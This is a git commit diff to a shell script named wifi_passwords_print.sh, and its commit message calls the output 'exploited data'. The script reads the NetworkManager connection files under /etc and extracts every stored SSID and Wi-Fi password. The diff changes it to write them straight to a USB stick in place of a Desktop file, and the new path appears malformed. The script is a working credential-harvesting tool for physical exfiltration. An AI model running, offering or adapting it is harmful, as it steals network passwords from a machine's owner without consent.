e824b93b822b2ef8b4224acd897598a7a1dabc96
AleksaMCode <aleksamcode@gmail.com>
2023-05-12 20:34:29 +0200

    Script optimised Instead of saving data to Desktop first and then moving it to USB drive, the exploited data is directly saved to USB.

--- scripts/wifi_passwords_print.sh
+++ scripts/wifi_passwords_print.sh
@@ -4,7 +4,4 @@ echo "Wireless_Network_Name Password\n--------------------- --------" > ~/Deskto
 for FILE in /etc/NetworkManager/system-connections/*
 do
     echo "$(cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(cat "$FILE" | grep -oP '(?<=psk=).*')"
-done >> ~/Desktop/wifi_pass.txt
-
-cp ~/Desktop/wifi_pass.txt /media/$(hostname)/UsbStick/
-rm ~/Desktop/wifi_pass.txt
+done >> media/$(hostname)/UsbStick//wifi_pass.txt
